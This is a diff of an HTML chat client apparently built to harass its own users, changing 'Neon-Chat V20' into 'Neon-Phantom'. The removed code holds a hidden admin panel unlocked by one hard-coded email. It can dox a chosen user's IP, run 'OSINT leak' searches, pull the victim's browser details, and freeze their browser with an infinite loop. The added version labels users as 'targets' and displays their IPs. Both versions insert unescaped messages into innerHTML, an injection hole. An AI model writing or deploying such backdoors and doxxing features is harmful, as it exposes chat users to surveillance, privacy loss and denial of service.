@@ -1,80 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Neon-Chat | Private</title>
+    <meta charset="UTF-8"><title>Neon-Chat V21</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; }
-        #gate { position: fixed; inset: 0; background: #000; z-index: 999; display: flex; align-items: center; justify-content: center; flex-direction: column; }
-        .panel { border: 1px solid #0f0; padding: 20px; background: #111; width: 300px; text-align: center; }
-        input { width: 90%; padding: 10px; margin: 5px 0; background: #000; color: #0f0; border: 1px solid #0f0; }
-        #app { display: flex; height: 100vh; }
-        #users { width: 250px; border-right: 1px solid #222; overflow-y: auto; }
-        #chat-zone { flex: 1; display: flex; flex-direction: column; }
-        #msgs { flex: 1; padding: 15px; overflow-y: auto; }
-        .u-item { padding: 10px; border-bottom: 1px solid #111; cursor: pointer; }
-        #master-box { position: fixed; top: 10px; right: 10px; border: 2px solid #f0f; background: #000; padding: 15px; display: none; width: 250px; }
-        .atk-btn { display: block; width: 100%; margin: 5px 0; background: #200; color: #f00; border: 1px solid #f00; cursor: pointer; font-size: 10px; }
+        body { background: #050505; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        #auth { position: fixed; inset: 0; background: #000; display: flex; align-items: center; justify-content: center; z-index: 100; }
+        .box { border: 1px solid #0f0; padding: 30px; background: #0a0a0a; box-shadow: 0 0 20px #0f0; }
+        input { display: block; width: 250px; padding: 10px; margin: 10px 0; background: #000; color: #0f0; border: 1px solid #0f0; }
+        #main { display: flex; height: 100vh; }
+        #side { width: 280px; border-right: 1px solid #0f0; padding: 10px; background: #080808; }
+        #view { flex: 1; display: flex; flex-direction: column; }
+        #msgs { flex: 1; padding: 20px; overflow-y: auto; }
+        .user-link { padding: 8px; border-bottom: 1px solid #111; cursor: pointer; }
+        .user-link:hover { background: #111; }
     </style>
 </head>
 <body>
-    <div id="gate">
-        <div class="panel">
-            <h2 style="color:#0ff">NEON-CHAT V20</h2>
-            <input type="text" id="n-in" placeholder="Username">
-            <input type="email" id="e-in" placeholder="Email (Premium)">
-            <button onclick="boot()" style="width:100%; background:#0f0; color:#000; border:none; padding:10px; font-weight:bold; cursor:pointer;">ENTER</button>
+    <div id="auth">
+        <div class="box">
+            <h2 style="text-align:center">NEON-PHANTOM LOGIN</h2>
+            <input type="text" id="nick" placeholder="Username">
+            <input type="email" id="mail" placeholder="Email">
+            <button onclick="start()" style="width:100%; padding:10px; background:#0f0; border:none; cursor:pointer; font-weight:bold;">ACCÉDER</button>
         </div>
     </div>
-
-    <div id="app">
-        <div id="users"></div>
-        <div id="chat-zone">
+    <div id="main">
+        <div id="side"><h3>CIBLES EN LIGNE</h3><div id="u-list"></div></div>
+        <div id="view">
             <div id="msgs"></div>
-            <div style="padding:15px; background:#111;"><input type="text" id="msg-in" onkeydown="if(event.key==='Enter')send()" placeholder="Message..."></div>
+            <div style="padding:20px;"><input type="text" id="m-in" onkeydown="if(event.key==='Enter')send()" style="width:95%" placeholder="Écrire..."></div>
         </div>
     </div>
-
-    <div id="master-box">
-        <h4 style="color:#f0f; margin:0">MASTER CONTROL</h4>
-        <div id="target-n" style="font-size:10px; color:#fff; margin:5px 0;">CIBLE: AUCUNE</div>
-        <button class="atk-btn" onclick="atk('p_heavy_dox')">DOX_IP_INFO</button>
-        <button class="atk-btn" onclick="atk('p_osint')">OSINT_LEAK_SEARCH</button>
-        <button class="atk-btn" onclick="atk('p_crash')">CRASH_UI (DDOS)</button>
-    </div>
-
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io(); let me = ""; let targetID = "";
-        function boot() {
-            me = document.getElementById('n-in').value; const e = document.getElementById('e-in').value;
-            if(!me || !e) return; document.getElementById('gate').style.display = 'none';
-            if(e === "toucheur2pp@heaven.com") document.getElementById('master-box').style.display = 'block';
-            socket.emit('init', { n: me, e: e });
+        const socket = io(); let myMail = "";
+        function start() {
+            const n = document.getElementById('nick').value; myMail = document.getElementById('mail').value;
+            if(n && myMail) { document.getElementById('auth').style.display = 'none'; socket.emit('init', { n:n, e:myMail }); }
         }
-        function send() { 
-            const t = document.getElementById('msg-in').value; 
-            if(t) { socket.emit('chat', { t: t, type: 'msg' }); document.getElementById('msg-in').value = ""; }
+        function send() {
+            const i = document.getElementById('m-in');
+            if(i.value) { socket.emit('chat', { t: i.value, type: 'msg' }); i.value = ""; }
         }
         socket.on('chat', d => {
-            const m = document.getElementById('msgs');
-            const b = document.createElement('div');
-            b.innerHTML = `<b style="color:${d.t.type==='intel'?'#ff0':'#0f0'}">${d.n}:</b> ${d.t.t}`;
-            m.appendChild(b); m.scrollTop = m.scrollHeight;
+            const div = document.createElement('div');
+            div.innerHTML = `<b style="color:${d.t.type==='intel'?'#f0f':'#0f0'}">${d.n}:</b> ${d.t.t}`;
+            document.getElementById('msgs').appendChild(div);
+            document.getElementById('msgs').scrollTop = 99999;
         });
         socket.on('sync', users => {
-            const uBox = document.getElementById('users'); uBox.innerHTML = "";
+            const list = document.getElementById('u-list'); list.innerHTML = "";
             users.forEach(u => {
-                const div = document.createElement('div'); div.className = 'u-item';
-                div.innerHTML = `<b>${u.n}</b><br><small style="color:#444">${u.ip || ''}</small>`;
-                div.onclick = () => { targetID = u.id; document.getElementById('target-n').innerText = `CIBLE: ${u.n} (${u.ip})`; };
-                uBox.appendChild(div);
+                const item = document.createElement('div'); item.className = 'user-link';
+                // Si tu es modo, l'IP s'affiche. Sinon, rien.
+                item.innerHTML = `<b>${u.n}</b><br><span style="color:#ff0; font-size:11px;">${u.ip || ''}</span>`;
+                list.appendChild(item);
             });
-        });
-        function atk(type) { if(targetID) socket.emit(type, targetID); }
-        socket.on('execute', d => {
-            if(d.type === 'p_heavy_dox') socket.emit('chat', { t: `[DATA] Browser: ${navigator.userAgent}`, type: 'intel' });
-            if(d.type === 'p_crash') while(true) { console.log("CRASHING..."); }
         });
     </script>
 </body>
